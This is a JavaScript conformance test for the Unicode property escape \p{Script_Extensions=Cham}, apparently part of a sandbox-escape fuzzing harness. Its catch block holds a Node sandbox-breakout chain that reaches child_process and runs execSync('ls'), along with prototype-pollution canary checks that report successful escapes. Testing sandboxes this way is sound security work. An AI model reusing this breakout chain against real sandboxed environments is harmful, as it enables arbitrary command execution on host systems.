try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                43520,
                43574
            ],
            [
                43584,
                43597
            ],
            [
                43600,
                43609
            ],
            [
                43612,
                43615
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script_Extensions=Cham}+$/u, matchSymbols, '\\p{Script_Extensions=Cham}');
    testPropertyEscapes(/^\p{Script_Extensions=Cham}+$/u, matchSymbols, '\\p{Script_Extensions=Cham}');
    testPropertyEscapes(/^\p{scx=Cham}+$/u, matchSymbols, '\\p{scx=Cham}');
    testPropertyEscapes(/^\p{scx=Cham}+$/u, matchSymbols, '\\p{scx=Cham}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                43519
            ],
            [
                43575,
                43583
            ],
            [
                43598,
                43599
            ],
            [
                43610,
                43611
            ],
            [
                43616,
                56319
            ],
            [
                57344,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script_Extensions=Cham}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Cham}');
    testPropertyEscapes(/^\P{Script_Extensions=Cham}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Cham}');
    testPropertyEscapes(/^\P{scx=Cham}+$/u, nonMatchSymbols, '\\P{scx=Cham}');
    testPropertyEscapes(/^\P{scx=Cham}+$/u, nonMatchSymbols, '\\P{scx=Cham}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}